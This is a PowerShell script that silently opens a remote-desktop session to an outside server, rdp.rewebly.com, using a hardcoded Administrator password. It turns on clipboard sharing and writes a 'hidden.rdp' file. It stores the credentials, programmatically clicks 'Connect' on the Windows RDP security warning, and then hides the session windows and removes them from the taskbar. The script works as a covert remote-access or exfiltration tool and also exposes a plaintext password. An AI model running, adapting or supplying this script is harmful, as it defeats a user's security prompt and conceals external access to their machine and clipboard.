# --- CONFIGURATION ---
$server = "rdp.rewebly.com"
$username = "Administrator"
$password = "!Mamoute901901a"

# --- RDP file ---
$rdpContent = @"
full address:s:$server
username:s:$username
redirectclipboard:i:1
screen mode id:i:2
authentication level:i:2
enablecredsspsupport:i:1
prompt for credentials:i:0
"@
$rdpFile = "$env:TEMP\hidden.rdp"
Set-Content -Path $rdpFile -Value $rdpContent -Encoding ASCII

# --- Store credentials ---
cmdkey /generic:TERMSRV/$server /user:$username /pass:$password

# --- Start RDP ---
$proc = Start-Process -FilePath "mstsc.exe" -ArgumentList $rdpFile -WindowStyle Minimized -PassThru

# --- C# to simulate button click ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

    public const int BM_CLICK = 0x00F5;
}
"@

# --- Wait up to 15 seconds for the RDP security window to appear ---
$clicked = $false
for ($i = 0; $i -lt 15; $i++) {
    Start-Sleep -Seconds 1

    # Look for the security warning window
    $hwnd = [Win32]::FindWindow("#32770", "Remote Desktop Connection security warning")
    if ($hwnd -ne [IntPtr]::Zero) {
        # Find the "Connect" button – usually Button class, second instance
        $btn = [Win32]::FindWindowEx($hwnd, [IntPtr]::Zero, "Button", "Connect")
        if ($btn -ne [IntPtr]::Zero) {
            # Click it
            [Win32]::SendMessage($btn, [Win32]::BM_CLICK, [IntPtr]::Zero, [IntPtr]::Zero)
            $clicked = $true
            break
        }
    }
}

if (-not $clicked) {
    Write-Host "Failed to find and click 'Connect' button."
}

# --- Optional: Hide all mstsc windows (unchanged) ---
if (-not ([System.Management.Automation.PSTypeName]'Win32Enum').Type) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32Enum {
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")]
        public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    }
"@
}

$mstscId = $proc.Id
$handles = @()

$callback = [Win32Enum+EnumWindowsProc]{
    param($hWnd, $lParam)
    $out = 0
    [Win32Enum]::GetWindowThreadProcessId($hWnd, [ref]$out) | Out-Null
    if ($out -eq $mstscId) { $script:handles += $hWnd }
    return $true
}

[Win32Enum]::EnumWindows($callback, [IntPtr]::Zero) | Out-Null

foreach ($hwnd in $handles) {
    [Win32Enum]::ShowWindowAsync($hwnd, 0) # SW_HIDE
    $exStyle = [Win32Enum]::GetWindowLong($hwnd, -20)
    $newExStyle = ($exStyle -bor 0x00000080) -band (-bnot 0x00040000)
    [Win32Enum]::SetWindowLong($hwnd, -20, $newExStyle) | Out-Null
}
